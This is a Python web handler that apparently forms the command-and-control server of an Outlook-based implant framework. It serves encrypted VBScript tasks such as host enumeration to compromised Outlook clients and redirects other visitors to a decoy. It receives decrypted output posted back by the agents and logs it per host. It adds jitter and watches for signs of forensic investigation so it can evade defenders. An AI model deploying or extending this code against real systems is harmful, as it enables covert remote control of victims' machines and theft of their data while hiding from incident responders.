import copy
from urllib.parse import unquote, urlparse
from lib.core.specagents import AgentClass
from lib.core.utility import encrypt_code, decrypt_code, TaskClass
import tornado
from datetime import datetime
from lib.core.setup import gconfig

class AgentDevComHandler(tornado.web.RequestHandler):
    def set_default_headers(self):
        self.set_header('Server', gconfig.SERVER_HEADER)

    def get(self):
        user_agent = self.request.headers.get("User-Agent")
        url = self.request.full_url()
        uri = self.request.uri
        remote_ip = self.request.remote_ip
        handled = False
        self.application.helpers.speclog("*** [INBOUND GET] (" + remote_ip + ") - [URL]: " + self.request.full_url())
        if self.application.helpers.inblocklist(remote_ip):
            self.application.helpers.speclog('*** [blocklisted IP] ({}): Valid GET endpoint request from blocklisted ip'.format(remote_ip))
            self.render('blocklist.html')
            return
        elif 'Outlook' in user_agent:
            self.application.helpers.speclog("*** [DEVAGENTCOM] (" + remote_ip + "): Valid Useragent")
            agent: AgentClass # type anotation
            if self.application.helpers.pastenddate():
                handled = True
                self.application.helpers.speclog("*** [ENDDATE] (" + remote_ip + "): Returning Nothing")
                self.render('dev_blank.html',
                            REFRESH_TIME=99999,
                            OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                            CLSID=gconfig.CLSID)
                return
            for agent in self.application.helpers.a_list:
                #Doing urlparse to compare only the url and not hostname
                if urlparse(agent.codeurl).path == uri: #Code url - server encrypted vbscode
                    self.application.helpers.speclog("*** [DEVAGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Requesting Encrypted Code")
                    self.set_header("Cache-Control", "no-store")
                    if len(agent.tasks) == 0:
                        self.set_status(404)
                    else:
                        code = agent.tasks[0].code
                        if agent.tasks[0].encrypt:
                            code = encrypt_code(code, agent.encryptionkey)
                        self.write(code)
                        handled = True
                        break
                if urlparse(agent.url).path == uri: #Unique url per agent
                    self.set_header("Cache-Control", "no-store")
                    self.application.helpers.speclog("*** [DEVAGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Unique Agent URL triggered")
                    self.application.helpers.speclog("*** [DEVAGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Updating Lastseen, Useragent and callback count")
                    agent.update_callback()
                    agent.lastcheckin = datetime.now().strftime(self.application.helpers.timeformat)
                    agent.useragent = user_agent
                    if agent.remoteip == "10.10.10.10": ## This is the task for prestaged clients to update db info
                        if agent.prestaged != True: # we flip this after the the first callin cycle
                            self.application.helpers.sendPush(remote_ip, "None", "[!] Unexpected Prestaged callback")
                            handled = True
                            self.render('dev_blank.html',
                                        REFRESH_TIME=self.application.helpers.addJitter(agent.jitter, agent.refreshtime),
                                        OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                                        CLSID=gconfig.CLSID)
                        else:
                            self.application.helpers.speclog("*** [DEVAGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Prestaged agents first checkin, executing special task to update database")
                            function_enc = encrypt_code("list_basic()",agent.encryptionkey) #Added for test
                            url_enc = encrypt_code(agent.url+"1194",agent.encryptionkey)
                            codeurl_enc = encrypt_code(agent.codeurl,agent.encryptionkey)
                            mod = self.application.helpers.get_module('enumerate/host/list_basic')
                            task = TaskClass('enumerate/host/list_basic',
                                             self.application.helpers.renderModule(mod),
                                             mod.entry,
                                             {},
                                             True)
                            agent.add_task(task)
                            handled = True
                            self.render('dev_encrypted_task_template.html',
                                        url=url_enc,
                                        function_name=function_enc,
                                        REFRESH_TIME=self.application.helpers.addJitter(agent.jitter, agent.refreshtime),
                                        OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                                        CODEURL=codeurl_enc,
                                        ENCRYPTIONKEY_LOCATION=gconfig.ENCRYPTIONKEY_REGISTRY_LOCATION,
                                        ENCRYPTIONKEY_VALUENAME=gconfig.ENCRYPTIONKEY_VALUENAME
                                        )
                        break
                    elif agent.remoteip != remote_ip:
                        self.application.helpers.sendPush(agent.remoteip, agent.hostname,
                                                      "New ip on existing agent, updating to {}".format(remote_ip))
                        agent.remoteip = remote_ip
                        handled = True
                        self.render('dev_blank.html',
                                    REFRESH_TIME=self.application.helpers.addJitter(agent.jitter, agent.refreshtime),
                                    OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                                    CLSID=gconfig.CLSID)
                        break
                    if agent.tasks == []: #NO TASKS IN QUEUE
                        self.application.helpers.speclog("*** [DEVAGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): No tasks in queue, rendering dev_blank.html")
                        handled = True
                        self.render('dev_blank.html',
                                    REFRESH_TIME=self.application.helpers.addJitter(agent.jitter, agent.refreshtime),
                                    OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                                    CLSID=gconfig.CLSID)
                        break
                    self.application.helpers.speclog("*** [DEVAGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Task Found - " + agent.tasks[0].name + " - Initiating Execution")
                    function = agent.tasks[0].entry + "()"
                    self.application.helpers.speclog("*** [DEVAGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): VBScript Function with Parameters sent - " + function)
                    function_enc = encrypt_code(function,agent.encryptionkey) #Added for test
                    url_enc = encrypt_code(agent.url,agent.encryptionkey)
                    codeurl_enc = encrypt_code(agent.codeurl,agent.encryptionkey)
                    template = 'encrypted_task_template.html'
                    handled = True
                    if len(agent.tasks) > 0 and not agent.tasks[0].encrypt:
                        if gconfig.DEBUG:
                            self.render('debugunencrypted_task_template.html',
                                        url=url_enc,
                                        function_name=function_enc,
                                        REFRESH_TIME=self.application.helpers.addJitter(agent.jitter, agent.refreshtime),
                                        OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                                        code=agent.tasks[0].code,
                                        CLSID=gconfig.CLSID)
                        else:
                            self.render('dev_unencrypted_task_template.html',
                                    url=url_enc,
                                    function_name=function_enc,
                                    REFRESH_TIME=self.application.helpers.addJitter(agent.jitter, agent.refreshtime),
                                    OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                                    CODEURL=codeurl_enc,
                                    CLSID=gconfig.CLSID,
                                    ENCRYPTIONKEY_LOCATION=gconfig.ENCRYPTIONKEY_REGISTRY_LOCATION,
                                    ENCRYPTIONKEY_VALUENAME=gconfig.ENCRYPTIONKEY_VALUENAME
                                    )
                    else:
                        self.render('dev_encrypted_task_template.html',
                                    url=url_enc,
                                    function_name=function_enc,
                                    REFRESH_TIME=self.application.helpers.addJitter(agent.jitter, agent.refreshtime),
                                    OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                                    CODEURL=codeurl_enc,
                                    CLSID=gconfig.CLSID,
                                    ENCRYPTIONKEY_LOCATION=gconfig.ENCRYPTIONKEY_REGISTRY_LOCATION,
                                    ENCRYPTIONKEY_VALUENAME=gconfig.ENCRYPTIONKEY_VALUENAME
                                    )
                    break
            if not handled:
                self.application.helpers.sendPush(remote_ip, "UNKNOWN",
                                                  "Call in to our valid handler url, but not in database")
                self.render('dev_blank.html',
                            REFRESH_TIME=99999,
                            OUTLOOK_VIEW_ID=gconfig.OUTLOOK_VIEW_ID,
                            CLSID=gconfig.CLSID)
            self.application.helpers.save_agents_to_file()
        else:
            self.application.helpers.speclog("*** [ALERT] (" + remote_ip + "): Inbound connection with wrong UserAgent - Useragent: " + user_agent)
            self.application.helpers.speclog("*** [ALERT] (" + remote_ip + "): REDIRECTING to " + gconfig.REDIRECT_FALSE_AGENTS + " **Evil laugh**")
            self.redirect(gconfig.REDIRECT_FALSE_AGENTS)

    def post(self):
        user_agent = self.request.headers.get("User-Agent")
        url = self.request.full_url()
        uri = self.request.uri
        remote_ip = self.request.remote_ip
        
        self.application.helpers.speclog("*** [INBOUND POST] (" + remote_ip + ") - [URL]: " + self.request.full_url())
        #TODO right now we return a 404, is that the intent
        if self.application.helpers.inblocklist(remote_ip) or self.application.helpers.pastenddate():
            self.application.helpers.speclog('*** [blocklisted IP or ENDDATE] ({}): Valid POST endpoint request from blocklisted ip'.format(remote_ip))
            self.set_status(404)
        elif 'Outlook' in user_agent:
            try:
                returndata = tornado.escape.json_decode(self.request.body)
                for agent in self.application.helpers.a_list:
                    if urlparse(agent.url).path+"1194" == uri:
                        ### Prestaged client running first update ###
                        self.application.helpers.speclog(
                            "*** [AGENTCOM] (" + remote_ip + "): RETURN DATA - " + returndata)
                        self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Prestaged client posting back for the first time")
                        self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Updating prestaged client database data")
                        returndata_decoded = decrypt_code(returndata,agent.encryptionkey)
                        agent.username = returndata_decoded.split()[1]
                        if agent.remoteip != '10.10.10.10' or agent.prestaged is not True: # not the first use of this prestaged agent
                            self.application.helpers.sendPush(agent.remoteip, agent.hostname, 'prestaged agent used more then once likely being investigated. new ip:hostname {}:{}'.format(self.request.remote_ip, returndata_decoded.split()[3]))
                            #TODO ok cool now what are we going to automatically do about it
                        else:
                            self.application.helpers.sendPush(self.request.remote_ip, returndata_decoded.split()[3], 'prestaged agent first checkin! ')
                        agent.hostname = returndata_decoded.split()[3]
                        agent.remoteip = self.request.remote_ip
                        agent.lastcheckin = datetime.now().strftime(self.application.helpers.timeformat)
                        agent.useragent = user_agent
                        self.application.helpers.save_agents_to_file()
                        break

                    if urlparse(agent.url).path == uri:
                        t = None
                        if agent.tasks != []:
                            #call return data handler of task
                            t = agent.tasks.pop(0)
                        self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Data returned from agent")
                        returndata_decoded = decrypt_code(returndata,agent.encryptionkey)
                        if t is None or t.printlog:
                            with open("agent_data/" + agent.hostname + ".txt", "a+") as agent_log:
                                agent_log.write(datetime.now().strftime(self.application.helpers.timeformat) +  " -- " + t.name + "\n")
                                agent_log.write(returndata_decoded + "\n\n")
                            self.application.helpers.speclog(
                                "*** [AGENTCOM] (" + remote_ip + "): RETURN DATA - " + returndata)
                            self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Data written to agent_data/" + agent.hostname + ".txt")
                        if t is not None:
                            mod = tmp = None
                            if t.name in self.application.helpers.modlist:
                                mod, tmp = self.application.helpers.modlist[t.name]
                            elif t.name in self.application.helpers.hiddenmods:
                                mod, tmp = self.application.helpers.hiddenmods[t.name]
                            if mod is not None:
                                module = mod.Spec(tmp, self.application.helpers)
                                try:
                                    module.rethandler(agent, t.options, returndata_decoded)
                                except Exception as msg:
                                    self.application.helpers.speclog("*** [AGENTCOM] ({}) ({}) error calling rethandler for task {}"
                                                                     "\t{}".format(remote_ip, agent.hostname, t.name, msg))
                                    pass
                                finally:
                                    del module
                                    del t
                            self.application.helpers.save_agents_to_file() #UPDATE DB FILE
                            self.application.helpers.speclog("*** [AGENTCOM] (" + remote_ip + ") (" + agent.hostname + "): Removed executed task from queue")
                        break
                    else:
                        self.set_status(404)
            except ValueError:
                self.application.helpers.speclog("*** [ALERT] (" + remote_ip + ") - POST data sent was invalid - Might be DFIR")
        else:
            self.application.helpers.speclog("*** [ALERT] (" + remote_ip + ") - Invalid Useragent on POST - Something phishy is going on!")
            self.set_status(404)